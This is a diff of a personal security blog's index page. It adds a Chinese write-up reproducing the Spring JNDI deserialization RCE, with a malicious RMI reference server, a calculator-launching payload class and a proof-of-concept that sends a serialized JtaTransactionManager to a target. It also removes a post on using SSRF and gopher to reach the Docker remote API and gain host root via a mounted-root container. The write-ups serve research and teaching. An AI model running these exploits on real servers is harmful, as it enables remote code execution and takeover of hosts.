@@ -317,6 +317,187 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/java-unserialize-learning-2/index.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Imagemlt">
+      <meta itemprop="description" content="personal blog">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Image's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/post/java-unserialize-learning-2/index.html" itemprop="url">
+                  Spring-jndi 反序列化漏洞分析复现
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-02-11 17:35:22" itemprop="dateCreated datePublished" datetime="2019-02-11T17:35:22+08:00">2019-02-11</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-03-22 08:32:27" itemprop="dateModified" datetime="2019-03-22T08:32:27+08:00">2019-03-22</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>打包发布于安全客<a href="https://www.anquanke.com/post/id/173459">https://www.anquanke.com/post/id/173459</a></p>
+</blockquote>
+<h2 id="spring-jndi反序列化"><a href="#spring-jndi反序列化" class="headerlink" title="spring-jndi反序列化"></a>spring-jndi反序列化</h2><p>众所周知Spring框架是一款用途广泛影响深远的java框架，因此Spring框架一旦出现漏洞也是影响深远。这次分析的Spring jdni反序列化漏洞主要存在于spring-tx包中，该包中的<code>org.springframeworkl.transation.jta.JtaTransationManager</code>类存在JDNI反序列化的问题，可以加载我们注册的RMI链接，然后将对象发送到有漏洞的服务器从而执行远程命令。首先应当注意本文中成功执行的Poc本人仅在jdk1.7中测试成功，而jdk1.8中未测试成功。</p>
+<h3 id="什么是JNDI"><a href="#什么是JNDI" class="headerlink" title="什么是JNDI?"></a>什么是JNDI?</h3><p><code>JNDI</code>(Java Naming and Directory Interface)是J2EE中的重要规范之一，是一组在Java应用中访问命名和目录服务的API，使得我们能够通过名称去查询数据源从而访问需要的对象。</p>
+<p>这里我们给出在java下的一段提供JNDI服务的代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(<span class="string">"Starting HTTP server"</span>);</span><br><span class="line">HttpServer httpServer = HttpServer.create(<span class="keyword">new</span> InetSocketAddress(<span class="number">8086</span>), <span class="number">0</span>);</span><br><span class="line">httpServer.createContext(<span class="string">"/"</span>,<span class="keyword">new</span> HttpFileHandler());</span><br><span class="line">httpServer.setExecutor(<span class="keyword">null</span>);</span><br><span class="line">httpServer.start();</span><br><span class="line">			</span><br><span class="line">System.out.println(<span class="string">"Creating RMI Registry"</span>);</span><br><span class="line">Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Reference reference = <span class="keyword">new</span> javax.naming.Reference(<span class="string">"ExportObject"</span>,<span class="string">"ExportObject"</span>,<span class="string">"http://127.0.01:8086/"</span>);</span><br><span class="line">ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(reference);</span><br><span class="line">registry.bind(<span class="string">"Object"</span>, referenceWrapper);</span><br></pre></td></tr></table></figure>
+<p>这里我们创建了一个HTTP服务后又创建了一个RMI服务,并且RMI服务提供了对<code>ExportObject</code>类的查询，这里ExportObject类的源码为：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExportObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ExportObject</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其功能便是执行我们验证rce时常用的调用计算器的功能。</p>
+<p>要加载ExportObject类我们可以使用以下的代码:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Context ctx=<span class="keyword">new</span> InitialContext();</span><br><span class="line">ctx.lookup(<span class="string">"rmi://127.0.0.1:1099/Object"</span>);</span><br><span class="line"><span class="comment">//System.out.println("loaded obj");</span></span><br></pre></td></tr></table></figure>
+<p>执行以下代码后可以发现ExportObject类的构造函数被调用，弹出了计算器。</p>
+<h3 id="Spring框架中的JNDI反序列化漏洞"><a href="#Spring框架中的JNDI反序列化漏洞" class="headerlink" title="Spring框架中的JNDI反序列化漏洞"></a>Spring框架中的JNDI反序列化漏洞</h3><p>导致JNDI反序列化问题的类主要是<code>org.springframework.transaction.jta.JtaTransactionManager</code>类。跟进该类的源码中的<code>readObject()</code>函数:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        <span class="keyword">this</span>.jndiTemplate = <span class="keyword">new</span> JndiTemplate();</span><br><span class="line">        <span class="keyword">this</span>.initUserTransactionAndTransactionManager();</span><br><span class="line">        <span class="keyword">this</span>.initTransactionSynchronizationRegistry();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>继续跟进<code>initUserTransactionAndTransactionManager()</code>函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">initUserTransactionAndTransactionManager</span><span class="params">()</span> <span class="keyword">throws</span> TransactionSystemException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.userTransaction == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.hasLength(<span class="keyword">this</span>.userTransactionName)) &#123;</span><br><span class="line">            <span class="keyword">this</span>.userTransaction = <span class="keyword">this</span>.lookupUserTransaction(<span class="keyword">this</span>.userTransactionName);</span><br><span class="line">            <span class="keyword">this</span>.userTransactionObtainedFromJndi = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.userTransaction = <span class="keyword">this</span>.retrieveUserTransaction();</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.userTransaction == <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.autodetectUserTransaction) &#123;</span><br><span class="line">                <span class="keyword">this</span>.userTransaction = <span class="keyword">this</span>.findUserTransaction();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>继续进一步跟进<code>lookupUserTransaction()</code>函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> UserTransaction <span class="title">lookupUserTransaction</span><span class="params">(String userTransactionName)</span> <span class="keyword">throws</span> TransactionSystemException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.logger.isDebugEnabled()) &#123;</span><br><span class="line">            <span class="keyword">this</span>.logger.debug(<span class="string">"Retrieving JTA UserTransaction from JNDI location ["</span> + userTransactionName + <span class="string">"]"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (UserTransaction)<span class="keyword">this</span>.getJndiTemplate().lookup(userTransactionName, UserTransaction.class);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> TransactionSystemException(<span class="string">"JTA UserTransaction is not available at JNDI location ["</span> + userTransactionName + <span class="string">"]"</span>, var3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到最终<code>return (UserTransaction)this.getJndiTemplate().lookup(userTransactionName, UserTransaction.class)</code>,跟进<code>JndiTemplate</code>类的<code>lookup</code>方法,</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(<span class="keyword">final</span> String name)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.logger.isDebugEnabled()) &#123;</span><br><span class="line">        <span class="keyword">this</span>.logger.debug(<span class="string">"Looking up JNDI object with name ["</span> + name + <span class="string">"]"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.execute(<span class="keyword">new</span> JndiCallback&lt;Object&gt;() &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">doInContext</span><span class="params">(Context ctx)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">            Object located = ctx.lookup(name);</span><br><span class="line">            <span class="keyword">if</span> (located == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> NameNotFoundException(<span class="string">"JNDI object with ["</span> + name + <span class="string">"] not found: JNDI implementation returned null"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> located;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>而<code>execute()</code>方法的定义如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">execute</span><span class="params">(JndiCallback&lt;T&gt; contextCallback)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        Context ctx = <span class="keyword">this</span>.getContext();</span><br><span class="line"></span><br><span class="line">        Object var3;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var3 = contextCallback.doInContext(ctx);<span class="comment">//此处触发RCE</span></span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.releaseContext(ctx);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var3;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到在整个流程的最后将会查询最开始我们由反序列化传入的<code>org.springframework.transaction.jta.JtaTransactionManager</code>类的对象的<code>userTransactionName</code>属性，最终导致加载了我们恶意的rmi源中的恶意类，从而导致RCE。</p>
+<h3 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h3><p>这个漏洞的Poc构造比起之前分析的apache common collections反序列化的Poc构造显然要简单许多：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(<span class="string">"Connecting to server "</span>+serverAddress+<span class="string">":"</span>+port);</span><br><span class="line">Socket socket=<span class="keyword">new</span> Socket(serverAddress,port);</span><br><span class="line">System.out.println(<span class="string">"Connected to server"</span>);</span><br><span class="line">String jndiAddress = <span class="string">"rmi://127.0.0.1:1099/Object"</span>;<span class="comment">//恶意的rmi注册源</span></span><br><span class="line">			</span><br><span class="line">org.springframework.transaction.jta.JtaTransactionManager object = <span class="keyword">new</span> org.springframework.transaction.jta.JtaTransactionManager();</span><br><span class="line">object.setUserTransactionName(jndiAddress);</span><br><span class="line">			</span><br><span class="line">System.out.println(<span class="string">"Sending object to server..."</span>);</span><br><span class="line">ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(socket.getOutputStream());</span><br><span class="line">objectOutputStream.writeObject(object);</span><br><span class="line">objectOutputStream.flush();</span><br></pre></td></tr></table></figure>
+<p>执行后可以发现成功弹出计算器。</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g02nr05wyuj317r0o1qem.jpg" alt></p>
+<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://blog.csdn.net/wn084/article/details/80729230">https://blog.csdn.net/wn084/article/details/80729230</a></p>
+<p><a href="https://github.com/zerothoughts/spring-jndi">https://github.com/zerothoughts/spring-jndi</a></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/apache-common-collections/index.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2100,262 +2281,6 @@ linker_and_loader->end</textarea><textarea id="flowchart-0-options" style="displ
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/SSRF-DOCKER-RCE/index.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Imagemlt">
-      <meta itemprop="description" content="personal blog">
-      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Image's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/post/SSRF-DOCKER-RCE/index.html" itemprop="url">
-                  利用SSRF攻击docker remote api从而获取服务器root权限的探索
-                </a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2018-08-16 08:57:59" itemprop="dateCreated datePublished" datetime="2018-08-16T08:57:59+08:00">2018-08-16</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <blockquote>
-<p>首发于freebuf <a href="http://www.freebuf.com/articles/web/179910.html">http://www.freebuf.com/articles/web/179910.html</a></p>
-</blockquote>
-<blockquote>
-<p>这几天在做关于自动化部署docker镜像方面的项目，从而接触到了docker的api，而docker的api也可以通过tcp连接的形式来进行访问。那么从一个安全爱好者的角度出发，是否可以利用docker的远程api来实现提权等一系列的操作？查找了各种资料之后，最后我探索到了一条通过SSRF漏洞来攻击docker远程api从而最终还能够获得远程主机的root权限的攻击思路，并写了这篇文章来记录一下整个过程及其防范的方法。</p>
-</blockquote>
-<h2 id="什么是docker远程api？"><a href="#什么是docker远程api？" class="headerlink" title="什么是docker远程api？"></a>什么是docker远程api？</h2><p>Docker Remote API是docker团队为了方便我们远程管理docker而为我们提供的一套api接口。在默认的情况下，docker daemon坚挺在unix socket上，通常为unix:///var/run/docker.sock。此外，在一些情况比如当我们需要远程管理docker服务器或者是创建docker集群的情况下，我们往往需要开启docker的远程api。这里给出在ubuntu上的一种开启方法：</p>
-<ul>
-<li>编辑<code>/lib/systemd/system/docker.service</code>文件，修改ExecStart一行为：</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[Service]</span><br><span class="line">Type=notify</span><br><span class="line"># the default is not to use systemd for cgroups because the delegate issues still</span><br><span class="line"># exists and systemd currently does not support the cgroup feature set required</span><br><span class="line"># for containers run by docker</span><br><span class="line">ExecStart=/usr/bin/dockerd -H fd:// -H tcp://0.0.0.0:4243</span><br><span class="line">ExecReload=/bin/kill -s HUP $MAINPID</span><br><span class="line">LimitNOFILE=1048576</span><br></pre></td></tr></table></figure>
-<ul>
-<li>之后再重启docker</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker restart</span><br></pre></td></tr></table></figure>
-<p>我们便可以利用docker client或者任意http客户端访问docker服务，例如<img src="http://image.3001.net/images/20180806/1533549633_5b681c41397a8.png!small" alt="docker_remote.png"></p>
-<p>可以看到docker提供的api其实也是一个restful形式的http接口，具体的文档可以再docker的官网获取：<a href="https://docs.docker.com/engine/api/v1.24/#31-containers">Engine API V1.24</a></p>
-<p>这里列出几个重要的接口：</p>
-<ul>
-<li>列出所有的容器</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl http:/localhost:4243/v1.24/containers/json</span><br></pre></td></tr></table></figure>
-<ul>
-<li>列出所有镜像</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl http:/localhost:4243/v1.24/images/json[&#123;</span><br><span class="line">  &quot;Id&quot;:&quot;sha256:31d9a31e1dd803470c5a151b8919ef1988ac3efd44281ac59d43ad623f275dcd&quot;,</span><br><span class="line">  &quot;ParentId&quot;:&quot;sha256:ee4603260daafe1a8c2f3b78fd760922918ab2441cbb2853ed5c439e59c52f96&quot;,</span><br><span class="line">  ...</span><br><span class="line">&#125;]</span><br></pre></td></tr></table></figure>
-<ul>
-<li>创建并运行容器</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ curl  -H &quot;Content-Type: application/json&quot; \</span><br><span class="line">  -d &apos;&#123;&quot;Image&quot;: &quot;alpine&quot;, &quot;Cmd&quot;: [&quot;echo&quot;, &quot;hello world&quot;]&#125;&apos; \</span><br><span class="line">  -X POST http:/localhost:4243/v1.24/containers/create</span><br><span class="line">&#123;&quot;Id&quot;:&quot;1c6594faf5&quot;,&quot;Warnings&quot;:null&#125;</span><br><span class="line"></span><br><span class="line">$ curl   -X POST http:/localhost:4243/v1.24/containers/1c6594faf5/start</span><br><span class="line"></span><br><span class="line">http:/localhost:4243/v1.24/containers/1c6594faf5/wait</span><br><span class="line">&#123;&quot;StatusCode&quot;:0&#125;</span><br><span class="line"></span><br><span class="line">$ curl  &quot;http:/localhost:4243/v1.24/containers/1c6594faf5/logs?stdout=1&quot;</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>
-<p>可以看到如果开放了docker远程api，我们便可以使用restful接口来实现一切docker容器的操作。</p>
-<h2 id="怎样利用docker容器提权？"><a href="#怎样利用docker容器提权？" class="headerlink" title="怎样利用docker容器提权？"></a>怎样利用docker容器提权？</h2><p>有些朋友可能会问了：docker容器内部是一个虚拟化的环境，与主机隔离，那么怎样才能利用docker容器达到主机的控制权？这里就涉及到docker运行时的用户权限了。<code>docker daemon</code>运行时是以root用户运行，因而具有极大的权限：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ps aux|grep dockerd</span><br><span class="line">root      1723  0.1  0.8 563472 68900 ?        Ssl  17:17   0:24 /usr/bin/dockerd -H fd:// -H tcp://0.0.0.0:4243</span><br><span class="line">image    25504  0.0  0.0  15984   936 pts/3    S+   21:12   0:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn dockerd</span><br></pre></td></tr></table></figure>
-<p>那么怎样通过docker daemon最终获得服务器的root权限？这里我们可以利用docker挂载宿主机文件的功能，直接挂载高权限目录，从而在容器内部获取宿主机的控制权限。这里有一个黑魔法：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</span><br></pre></td></tr></table></figure>
-<p>运行后的输出如下：<img src="http://image.3001.net/images/20180806/1533549670_5b681c66b2a75.png!small" alt="verify">我们退出docker,查看宿主机/root/目录：<img src="http://image.3001.net/images/20180806/1533549678_5b681c6ee6b4c.png!small" alt="success">可以看到我们成功写入了/root文件夹一个文件。上面那条命令 <code>docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</code>主要的作用是：从 Docker Hub 上面下载我们指定的镜像，然后运行。参数 -v 将容器外部的目录 / 挂载到容器内部 /hostOS，并且使用 -i 和 -t 参数进入容器的 shell。而这个镜像<code>rootplease</code>在容器内部执行了一个脚本<code>exploit.sh</code>，主要内容便是chroot到/hostOS中。这样我们便通过读写宿主机的任意文件实现了获取宿主机的最高权限。这个镜像的源码可以在<a href="https://github.com/chrisfosterelli/dockerrootplease/blob/master/exploit.sh">Github</a>上获取。</p>
-<h2 id="怎样通过SSRF完成攻击？"><a href="#怎样通过SSRF完成攻击？" class="headerlink" title="怎样通过SSRF完成攻击？"></a>怎样通过SSRF完成攻击？</h2><p>这里我们的服务器端环境如下:</p>
-<p><img src="http://image.3001.net/images/20180806/1533549693_5b681c7d2b544.png!small" alt="environ"></p>
-<p>这里我们来看在php中经常出现的导致SSRF漏洞的代码实现：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$curl=curl_init();</span><br><span class="line">curl_setopt($curl,CURLOPT_URL,$_GET[&apos;url&apos;]);</span><br><span class="line">curl_setopt($curl,CURLOPT_HEADER,0);</span><br><span class="line">curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);</span><br><span class="line">$data=curl_exec($curl);</span><br><span class="line">curl_close($curl);</span><br><span class="line">print_r($data);</span><br></pre></td></tr></table></figure>
-<p>php中通常使用libcurl来实现http请求，这里可以看到<code>$_GET[&#39;url&#39;]</code>可控，从而可以请求任意站点，从而构成了SSRF漏洞。但是有的读者有可能会问：docker的api有很大一部分是需要post的，那么怎样才能发送post封包？这里便祭出我们的大杀器——<code>gopher协议</code>。Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。 这里Ricterz师傅曾经写过一篇很好的<a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2">关于gopher协议扩展ssrf攻击面的文章</a>。因此我们便可以通过gopher协议来访问内网开放的<code>docker api</code>从而实现攻击。我们可以先尝试获取所有的镜像：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@1ae6b62d1757:/var/www/html# curl localhost/curl.php?url=http://172.17.0.1:4243/containers/json</span><br><span class="line">[&#123;&quot;Id&quot;:&quot;fa169d6b4239882bb6a0a2d564fd9891c04cf199ac12daec514f69febf960e9b&quot;,&quot;Names&quot;:[&quot;/quirky_mcnulty&quot;],&quot;Image&quot;:&quot;chrisfosterelli/rootplease&quot;,&quot;ImageID&quot;:&quot;sha256:0db941813769383d7ed3bdcccd27af1b6d7b47ed0fb33f1b47f7bb937529fa3e&quot;,&quot;Command&quot;:&quot;/bin/bash exploit.sh&quot;,&quot;Created&quot;:1533475418,&quot;Ports&quot;:[],&quot;Labels&quot;:&#123;&#125;,&quot;State&quot;:&quot;running&quot;,&quot;Status&quot;:&quot;Up 17 